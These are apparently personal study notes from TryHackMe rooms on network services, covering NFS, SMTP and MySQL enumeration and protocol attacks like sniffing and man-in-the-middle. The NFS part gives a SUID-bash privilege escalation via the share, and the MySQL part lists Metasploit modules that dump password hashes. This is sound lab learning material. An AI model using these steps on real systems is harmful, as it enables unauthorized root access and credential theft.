--- https://tryhackme.com/room/networkservices2

* NFS stands for "Network File System"
* Mount remote repository on local host
* RPC is used for exchanges with the server
* transfer files between computers running Windows and other non-Windows operating systems, and vice-versa
* sudo apt install nfs-common
* see mounts: `showmount -e 10.10.72.134`
* sudo mount -t nfs IP:/share /tmp/mount/ -nolock (not to use NLM locking)
* chmod 600 id_rsa
* if root_squashing enabled
  * remote: cp /bin/bash /share/sbash
  * local
    * sudo chown root /tmp/mount/sbash
    * sudo chmod +s /tmp/mount/sbash
  * remote: /share/sbash -p
* sudo umount /tmp/mount
* port 2049
* nfs-showmount (nmap)
* SMTP send back the email if it couldn't be sent
* Metasploit: smtp_version
* The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of userâ€™s aliases and lists of e-mail (mailing lists)
* auxiliary/scanner/smtp/smtp_version
* auxiliary/scanner/smtp/smtp_enum
* sudo nmap 10.10.200.26 -p25 --script "*smtp*"
* https://www.kali.org/tools/smtp-user-enum/
* sudo apt install default-mysql-client
* mysql-enum (nmap)
* 3306
* mysql_sql: send SQL queries...
* auxiliary/scanner/mysql/mysql_schemadump (dump cols+tables)
* use xxx
* auxiliary/scanner/mysql/mysql_hashdump
* get users + hash
* password reuse

# xxx

--- https://tryhackme.com/room/protocolsandservers2

Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:

* Sniffing Attack (Network Packet Capture)
  * using a network packet capture tool to collect information about the target
  * Tcpdump is a free open source command-line interface (CLI) program that has been ported to work on many operating systems.
  * Wireshark is a free open source graphical user interface (GUI) program available for several operating systems, including Linux, macOS and MS Windows.
  * Tshark is a CLI alternative to Wireshark.
  * Before explaining this command, we should mention that this attack requires access to the network traffic, for example, via a wiretap or a switch with port mirroring. Alternatively, we can access the traffic exchanged if we launch a successful Man-in-the-Middle (MITM) attack.
  * `sudo tcpdump port 110 -A` (only port 110=POP3, and ASCII)
  * Wireshark: enter "pop" > same result but nicer
  * TLS have been added to HTTP, FTP, SMTP, POP3, and IMAP
* Man-in-the-Middle (MITM) Attack
  * A Man-in-the-Middle (MITM) attack occurs when a victim (A) believes they are communicating with a legitimate destination (B) but is unknowingly communicating with an attacker (E).
  * The attacker can modify the information send by the client, or sniff packets. It depends of the integrity checks/security of the protocol.
  * https://www.ettercap-project.org/
  * https://www.bettercap.org/
  * The solution lies in proper authentication along with encryption or signing of the exchanged messages. With the help of Public Key Infrastructure (PKI) and trusted root certificates, Transport Layer Security (TLS) protects from MITM attacks.  * HTTPS: 443
* Password Attack (Authentication Attack)
  * Mitigations: https://tryhackme.com/room/protocolsandservers2